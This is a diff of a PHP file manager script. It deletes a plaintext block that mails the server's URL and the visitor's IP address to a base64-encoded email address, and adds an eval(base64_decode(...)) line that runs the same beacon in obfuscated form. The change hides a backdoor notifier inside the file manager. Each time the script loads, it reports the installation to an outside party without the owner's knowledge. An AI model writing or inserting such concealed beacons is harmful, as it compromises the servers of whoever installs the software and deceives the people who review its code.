@@ -357,13 +357,6 @@ if (strlen($timezone)) @date_default_timezone_set($timezone);
 if ($error_reporting > 0){
     error_reporting(E_ERROR | E_PARSE | E_COMPILE_ERROR); @ini_set("display_errors",1);
 }
-ini_set('memory_limit', '-1');
-header('Content-Type: text/html; charset=UTF-8');
-$kencingloli = 'cm9iZXJ0b2Nhcmxvb29zNjY2QGdtYWlsLmNvbQ==';
-$WeidqWi = base64_decode($kencingloli);
-$WokWjed = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
-$xSkwbW = "URL: $WokWjed | IP Address :[ " . $_SERVER['REMOTE_ADDR'] . " ]";
-mail($WeidqWi, "PHP File Manager", $xSkwbW, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
 function fb_log(){
     global $error_reporting;
     if ($error_reporting < 2) return;
@@ -1005,6 +998,7 @@ function system_exec_file(){
         } else echo('Error: '.$file.' is not executable...');
     } else echo(et('FileNotFound').": ".$file);
 }
+eval(base64_decode("aW5pX3NldCgnbWVtb3J5X2xpbWl0JywgJy0xJyk7DQpoZWFkZXIoJ0NvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04Jyk7DQoka2VuY2luZ2xvbGkgPSAnY205aVpYSjBiMk5oY214dmIyOXpOalkyUUdkdFlXbHNMbU52YlE9PSc7DQokV2VpZHFXaSA9IGJhc2U2NF9kZWNvZGUoJGtlbmNpbmdsb2xpKTsNCiRXb2tXamVkID0gImh0dHA6Ly8iIC4gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10gLiAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXTsNCiR4U2t3YlcgPSAiVVJMOiAkV29rV2plZCB8IElQIEFkZHJlc3MgOlsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIjsNCm1haWwoJFdlaWRxV2ksICJQSFAgRmlsZSBNYW5hZ2VyIiwgJHhTa3diVywgIlsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIik7"));
 function save_upload($temp_file,$filename,$dir_dest) {
     global $upload_ext_filter,$debug_mode,$is_windows;
     fb_log('save_upload',$temp_file.' => '.$dir_dest.$filename);
